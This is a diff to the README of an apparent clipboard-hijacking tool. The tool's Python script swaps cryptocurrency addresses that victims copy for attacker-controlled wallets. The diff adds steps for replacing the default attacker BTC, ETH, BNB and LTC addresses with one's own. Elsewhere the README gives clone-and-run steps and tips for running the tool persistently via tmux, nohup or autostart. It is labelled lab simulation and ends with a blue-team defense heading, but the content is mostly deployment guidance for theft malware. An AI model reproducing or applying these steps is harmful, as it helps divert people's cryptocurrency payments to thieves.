@@ -59,6 +59,7 @@ Ensure Python 3 is installed on your machine. Then:
 
 ### 1. Clone the Repository
 git clone https://github.com/OgbekileX/clipboard-hijacker.git
+
 cd clipboard-hijacker
 
 ### 2. Install Python Dependencies
@@ -87,6 +88,45 @@ The script will now send a message each time a clipboard replacement occurs.
 python hijacker.py
 
 You can use tools like tmux, screen, nohup, or autostart methods if you wish to run it persistently.
+
+### 🔧 How to Customize Wallet Addresses
+You can easily replace the default attacker wallet addresses with your own by editing the main script.
+
+## Steps:
+Open the hijacker.py file using any code or text editor:
+
+*nano hijacker.py*
+
+or
+
+*code hijacker.py*       # if you're using VS Code
+
+Find the section with wallet mappings:
+
+wallet_map = {
+
+    |"BTC": "bc1qgxj7prjxa6v3ay6nq34hv5gzn7mxde0e7mm6m0",|
+    
+    |"ETH": "0x18d4A160651A0Dc1b21A22f1A997d0eA27978668",|
+    
+    "BNB": "0x18d4A160651A0Dc1b21A22f1A997d0eA27978668",
+    
+    "LTC": "ltc1qnp44ela6xyxn800p5cjz23zcfvfu7lx9jgzd3w",
+    
+    ...
+}
+
+Replace any address with your own (for lab simulation), e.g.:
+
+
+"BTC": "bc1qNEWyourBTCwalletaddresshere"
+
+Save and exit the file.
+
+
+You’re now simulating clipboard hijacking with your own crypto addresses.
+
+
 
 ### 🛡️ For Blue Teams: How to Defend Against Clipboard Hijacking
 ✅ Monitor clipboard access with endpoint detection tools
